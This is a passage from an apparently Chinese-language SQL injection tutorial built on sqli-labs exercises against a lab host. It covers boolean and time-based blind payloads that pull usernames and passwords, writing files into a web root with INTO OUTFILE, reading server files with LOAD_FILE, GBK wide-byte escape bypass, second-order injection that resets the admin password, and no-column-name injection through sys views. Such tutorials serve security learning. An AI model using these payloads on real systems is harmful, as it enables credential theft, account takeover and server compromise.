<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT username from security.users LIMIT 0,1),1)=&#39;d&#39;--+ </code>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT concat_ws(&#39;:&#39;,username,password) from security.users LIMIT 0,1),9)=&#39;dumb:dumb&#39;--+ </code>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT GROUP_CONCAT(username,&#39;:&#39;,password) from security.users),14)=&#39;dumb:dumb,ange&#39;--+</code></p>
</blockquote>
<h2 id="九、时间盲注"><a href="#九、时间盲注" class="headerlink" title="九、时间盲注"></a>九、时间盲注</h2><p>布尔盲注适用于有错误与正确不同响应的页面，而对于那些无论对错，页面响应始终不变的网站，就可以使用时间盲注</p>
<p>时间盲注的基本原理和布尔注入相差不多，使用<code>if语句</code>以及<code>sleep函数</code>，构造布尔表达式，当布尔表达式正确时，则执行<code>sleep函数</code></p>
<p><a target="_blank" rel="noopener" href="http://10.211.55.6/sqli-labs/Less-9/">http://10.211.55.6/sqli-labs/Less-9/</a></p>
<blockquote>
<p>?id&#x3D;<code>1&#39;and&#39;1&#39;=&#39;1 </code>?id&#x3D;<code>1&#39;and&#39;1&#39;=&#39;2</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/95740020-1501-4094-bc00-8dcafb4974c6/Untitled.png" alt="Untitled"></p>
<p>可以看到无论布尔表达式是否为True，页面响应都不变，此时再使用布尔盲注就不合适了</p>
<blockquote>
<p>?id&#x3D;<code>1&#39;and if(1=1,sleep(5),0)--+ </code>?id&#x3D;<code>1&#39;and if(1=2,sleep(5),0)--+</code></p>
</blockquote>
<p>可以明显观察到页面的响应时间不同，利用这个特性，就可以根据响应时长，判断布尔表达式是否正确</p>
<h3 id="1、判断闭合-3"><a href="#1、判断闭合-3" class="headerlink" title="1、判断闭合"></a>1、判断闭合</h3><blockquote>
<p>?id&#x3D;<code>1&#39;and if(1=1,sleep(5),0)--+</code></p>
</blockquote>
<p>将单引号替换为其他符号进行测试，出现延迟的符号即为正确的符号</p>
<h3 id="2、判断数据库"><a href="#2、判断数据库" class="headerlink" title="2、判断数据库"></a>2、判断数据库</h3><p>使用<code>limit</code>关键字来限制输出</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> schema_name <span class="keyword">from</span> information_schema.schemata LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>与布尔类型注入基本相同，但是使用<code>if语句</code>来进行判断</p>
<blockquote>
<p>?id&#x3D;<code>1&#39;and if((LEFT((SELECT schema_name from information_schema.schemata LIMIT 7,1),1) LIKE &#39;s&#39;),sleep(5),0)--+</code></p>
</blockquote>
<h3 id="3、判断表名"><a href="#3、判断表名" class="headerlink" title="3、判断表名"></a>3、判断表名</h3><p>查询数据库security中的表</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span></span><br></pre></td></tr></table></figure>

<p>判断表名</p>
<blockquote>
<p>?id&#x3D;<code>1&#39;and if((LEFT((SELECT table_name from information_schema.tables where table_schema=&#39;security&#39; LIMIT 0,1),1)=&#39;e&#39;),sleep(5),0)--+</code></p>
</blockquote>
<p>不断推测出其他的表名</p>
<h3 id="4、判断列名"><a href="#4、判断列名" class="headerlink" title="4、判断列名"></a>4、判断列名</h3><p>查询security.users表中的字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>?id&#x3D;<code>1&#39;and if((LEFT((SELECT column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; LIMIT 0,1),1)=&#39;i&#39;),sleep(5),0)--+</code></p>
</blockquote>
<h3 id="5、猜测数据"><a href="#5、猜测数据" class="headerlink" title="5、猜测数据"></a>5、猜测数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">from</span> security.users</span><br><span class="line"><span class="keyword">SELECT</span> concat_ws(<span class="string">&#x27;:&#x27;</span>,username,password) <span class="keyword">from</span> security.users</span><br><span class="line"><span class="keyword">SELECT</span> GROUP_CONCAT(username,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> security.users</span><br></pre></td></tr></table></figure>

<blockquote>
<p>?id&#x3D;<code>1&#39;and if((LEFT((SELECT username from security.users LIMIT 0,1),1)=&#39;d&#39;),sleep(5),0)--+ </code>?id&#x3D;<code>1&#39;and if((LEFT((SELECT concat_ws(&#39;:&#39;,username,password) from security.users LIMIT 0,1),9)=&#39;dumb:dumb&#39;),sleep(5),0)--+ </code>?id&#x3D;<code>1&#39;and if((LEFT((SELECT GROUP_CONCAT(username,&#39;:&#39;,password) from security.users),14)=&#39;dumb:dumb,ange&#39;),sleep(5),0)--+</code></p>
</blockquote>
<h2 id="十、注入脚本编写"><a href="#十、注入脚本编写" class="headerlink" title="十、注入脚本编写"></a>十、注入脚本编写</h2><p>盲注与联合注入和报错注入不同，盲注需要逐字符的去不断猜测，如果单纯使用手工注入的话，就需要大量的时间</p>
<p>这里可以使用脚本进行批量的注入</p>
<h3 id="1、布尔盲注脚本"><a href="#1、布尔盲注脚本" class="headerlink" title="1、布尔盲注脚本"></a>1、布尔盲注脚本</h3><h3 id="2、时间盲注脚本"><a href="#2、时间盲注脚本" class="headerlink" title="2、时间盲注脚本"></a>2、时间盲注脚本</h3><h2 id="十一、注入写马与文件读取"><a href="#十一、注入写马与文件读取" class="headerlink" title="十一、注入写马与文件读取"></a>十一、注入写马与文件读取</h2><h3 id="1、先决条件"><a href="#1、先决条件" class="headerlink" title="1、先决条件"></a>1、先决条件</h3><ul>
<li>当前用户为<code>root权限</code>或具有<code>FILE权限</code>，使用语句进行查询</li>
<li><code>secure_file_priv=&#39;’</code></li>
<li>要写入的目录需要具有<code>写权限</code></li>
<li>获取当前网站绝对路径，绝对路径可以通过网站的各种信息泄露来发现</li>
<li>php的gpc为off状态，若在开启gpc的情况下，可以通过十六进制的路径读写文件</li>
</ul>
<p>查询当前用户权限</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> file_priv,<span class="keyword">user</span>,host <span class="keyword">from</span> mysql.user;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+---------------+-----------+</span></span><br><span class="line"><span class="operator">|</span> file_priv <span class="operator">|</span> <span class="keyword">user</span>          <span class="operator">|</span> host      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+---------------+-----------+</span></span><br><span class="line"><span class="operator">|</span> Y         <span class="operator">|</span> root          <span class="operator">|</span> localhost <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> N         <span class="operator">|</span> mysql.session <span class="operator">|</span> localhost <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> N         <span class="operator">|</span> mysql.sys     <span class="operator">|</span> localhost <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> N         <span class="operator">|</span> dvwa          <span class="operator">|</span> localhost <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Y         <span class="operator">|</span> root          <span class="operator">|</span> <span class="operator">%</span>         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+---------------+-----------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>查询<code>secure_file_priv</code> 的值</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> @<span class="variable">@secure</span>_file_priv;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> @<span class="variable">@secure</span>_file_priv <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span>               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"># secure_file_priv 的值有三种情况</span><br><span class="line"><span class="number">1.</span> 空      那么对所有路径均可进行导入导出。</span><br><span class="line"><span class="number">2.</span> 目录    那么只允许在该路径下导入导出。</span><br><span class="line"><span class="number">3.</span> <span class="keyword">Null</span>   那么禁止所有导入导出。</span><br></pre></td></tr></table></figure>

<aside>

<p>💡 在<code>mysql 5.6.34</code>版本以后 <code>secure_file_priv</code>的值默认为<code>NULL</code></p>
</aside>

<h3 id="2、写入木马"><a href="#2、写入木马" class="headerlink" title="2、写入木马"></a>2、写入木马</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;? phpinfo(); ?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;C:/ phpstudy_pro/WWW/phpinfo.php&#x27;</span>  # phpinfo()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>‘ into outfile ‘C:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;phpinfo.php’–+&#96;</p>
</blockquote>
<p>若提示如下错误，则表明当前的文件夹没有权限进行上传</p>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/89bdfd14-818d-44bf-8490-637f4d0199b4/Untitled.png" alt="Untitled"></p>
<aside>

<p>💡 windows下：修改<code>my.ini</code> 在<code>[mysqld]</code>内加入<code>secure_file_priv =</code></p>
<p>linux下：修改<code>my.cnf</code>在<code>[mysqld]</code>内加入<code>secure_file_priv =</code></p>
<p>然后重启mysql，再查询<code>secure_file_priv</code></p>
</aside>

<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a7bc4f6c-3ef5-4df5-ace0-0e21be7b92a1/Untitled.png" alt="Untitled"></p>
<h3 id="3、读取文件"><a href="#3、读取文件" class="headerlink" title="3、读取文件"></a>3、读取文件</h3><p>读取文件使用的<code>load_file()</code> ,括号内传入文件路径。文件路径必须是<code>/</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> LOAD_FILE(<span class="string">&#x27;C:/phpstudy_pro/Extensions/MySQL5.7.26/my.ini&#x27;</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;union select 1,LOAD_FILE(&#39;C:/phpstudy_pro/Extensions/MySQL5.7.26/my.ini&#39;)--+</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a5fbaf70-a1cc-4fce-95c8-d25c4c63e39b/Untitled.png" alt="Untitled"></p>
<h2 id="十一、宽字节注入"><a href="#十一、宽字节注入" class="headerlink" title="十一、宽字节注入"></a>十一、宽字节注入</h2><p>宽字节是相对于ascII这样单字节而言的，像GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节</p>
<p>GBK是一种多字符的编码，通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节</p>
<p>转义函数：为了过滤用户输入的一些数据，对特殊的字符加上反斜杠“\”进行转义；Mysql中转义的函数addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种是配置magic_quote_gpc，不过PHP高版本已经移除此功能</p>
<p>宽字节注入指的是mysql数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个ascii码要大于128（比如<code>%df</code>），才到汉字的范围），而且当我们输入单引号时，mysql会调用转义函数，将单引号变为<code>\&#39;</code>，其中<code>\</code>的十六进制是<code>%5c</code>,mysql的GBK编码，会认为<code>%df%5c</code>是一个宽字节，也就是<code>&#39;運&#39;</code>，从而使单引号闭合（逃逸），进行注入攻击</p>
<p><a target="_blank" rel="noopener" href="http://10.211.55.6/sqli-labs/Less-32/">http://10.211.55.6/sqli-labs/Less-32/</a></p>
<h3 id="1、注入尝试"><a href="#1、注入尝试" class="headerlink" title="1、注入尝试"></a>1、注入尝试</h3><p>输入单引号</p>
<blockquote>
<p>?id&#x3D;1%df’</p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/17b06b01-922a-4df3-85d5-d43c7f966f46/Untitled.png" alt="Untitled"></p>
<p>页面无报错</p>
<blockquote>
<p>?id&#x3D;1%df’</p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/07816e7c-3098-4d2a-adac-aa5eb4ff1d15/Untitled.png" alt="Untitled"></p>
<p>此时单引号已经逃逸出来，后续步骤和之前相同</p>
<p>若遇到<code>table_name=&#39;users&#39;</code> 可以使用十六进制进行代替</p>
<h2 id="十二、二次注入"><a href="#十二、二次注入" class="headerlink" title="十二、二次注入"></a>十二、二次注入</h2><p>二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入</p>
<p><a target="_blank" rel="noopener" href="http://10.211.55.6/sqli-labs/Less-24/">http://10.211.55.6/sqli-labs/Less-24/</a></p>
<p>file:&#x2F;&#x2F;Less-24&#x2F;login.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$username</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line">   <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span></span><br><span class="line">   <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be real smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">   <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_row</span>(<span class="variable">$res</span>);</span><br><span class="line">  <span class="comment">//print_r($row) ;</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用了<code>mysql_real_escape_string</code> 函数转义了传入字符串的特殊字符，导致无法进行注入</p>
<p>file:&#x2F;&#x2F;Less-24&#x2F;pass_change.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Validating the user input........</span></span><br><span class="line">  <span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">  <span class="variable">$curr_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line">  <span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">  <span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">  &#123;  </span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_affected_rows</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Password successfully updated&quot;</span>;</span><br><span class="line">  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: failed.php&#x27;</span>);</span><br><span class="line">      <span class="comment">//echo &#x27;You tried to be smart, Try harder!!!! :( &#x27;;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>同样使用了<code>mysql_real_escape_string</code> 函数转义</p>
<p>但username是直接从seesion中取出的，并未进行转义和过滤</p>
<p>这里可以通过控制username的名字来进行注入</p>
<p>首先注册admin’– - 账号，密码任意</p>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/95924047-1697-4768-9596-29b36005e662/Untitled.png" alt="Untitled"></p>
<p>若此时再修改密码，后台语句则变为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;admin&#x27;-- &#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure>

<p>此时admin的密码将会修改为指定的密码</p>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fa6d3999-5d4e-43bd-a184-2641f4d482ee/Untitled.png" alt="Untitled"></p>
<p>同样，可以利用这注入点进行盲注的判断</p>
<blockquote>
<p>admin’ and left(database(),8)&#x3D;’security’– -</p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9c253d4b-4ebc-4959-a7d9-804fb4b866d9/Untitled.png" alt="Untitled"></p>
<h2 id="十三、无列名注入"><a href="#十三、无列名注入" class="headerlink" title="十三、无列名注入"></a>十三、无列名注入</h2><p>当<code>information_schema</code>或<code>列名</code>被过滤时，将无法使用列来进行数据的查询，此时可使用无列名注入</p>
<p>二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。</p>
<h3 id="1、基本原理"><a href="#1、基本原理" class="headerlink" title="1、基本原理"></a>1、基本原理</h3><p>观察如下语句的输出</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> security.users</span><br></pre></td></tr></table></figure>

<p>此时列名已经更改为<code>1,2,3</code></p>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c35fa418-6888-471f-8d73-cb270d4f29e7/Untitled.png" alt="Untitled"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">2</span>` <span class="keyword">FROM</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> `security`.users)a</span><br></pre></td></tr></table></figure>

<p>前方列名要加上反引号&#96;&#96;&#96; 否则结果不能正常输出</p>
<p>后方要加上别名</p>
<p>若过滤了反引号，则可以使用别名代替</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> b,d <span class="keyword">FROM</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">as</span> d <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> `security`.users)a</span><br></pre></td></tr></table></figure>

<h3 id="2、获取数据库名"><a href="#2、获取数据库名" class="headerlink" title="2、获取数据库名"></a>2、获取数据库名</h3><p>sys视图</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_schema <span class="keyword">FROM</span> `sys`.`schema_auto_increment_columns`;</span><br><span class="line"><span class="keyword">SELECT</span> table_schema <span class="keyword">FROM</span> `sys`.`schema_index_statistics`;</span><br><span class="line"><span class="keyword">SELECT</span> table_schema <span class="keyword">FROM</span> `sys`.`schema_table_statistics`;</span><br><span class="line"><span class="keyword">SELECT</span> table_schema <span class="keyword">FROM</span> `sys`.`schema_table_statistics_with_buffer`;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3、获取表名"><a href="#3、获取表名" class="headerlink" title="3、获取表名"></a>3、获取表名</h3><p>在MySQL 5.7.9中sys中新增了一些视图，可以从中获取表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>包含<span class="keyword">in</span></span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `sys`.`x$innodb_buffer_stats_by_table` <span class="keyword">where</span> object_schema <span class="operator">=</span> database();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `sys`.`innodb_buffer_stats_by_table` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`x$schema_index_statistics` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`schema_index_statistics` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`schema_auto_increment_columns` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>不包含<span class="keyword">in</span></span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`x$schema_flattened_keys` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`schema_table_statistics` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`x$ps_schema_table_statistics_io` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`x$schema_table_statistics_with_buffer` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`schema_table_statistics_with_buffer` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>通过表文件的存储路径获取表名</span><br><span class="line"><span class="keyword">SELECT</span> FILE <span class="keyword">FROM</span> `sys`.`io_global_by_file_by_bytes` <span class="keyword">WHERE</span> FILE REGEXP DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> FILE <span class="keyword">FROM</span> `sys`.`io_global_by_file_by_latency` <span class="keyword">WHERE</span> FILE REGEXP DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> FILE <span class="keyword">FROM</span> `sys`.`x$io_global_by_file_by_bytes` <span class="keyword">WHERE</span> FILE REGEXP DATABASE();</span><br></pre></td></tr></table></figure>

<p>performance_schema</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`objects_summary_global_by_type` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_handles` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_io_waits_summary_by_index_usage` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_io_waits_summary_by_table` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_lock_waits_summary_by_table` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br></pre></td></tr></table></figure>

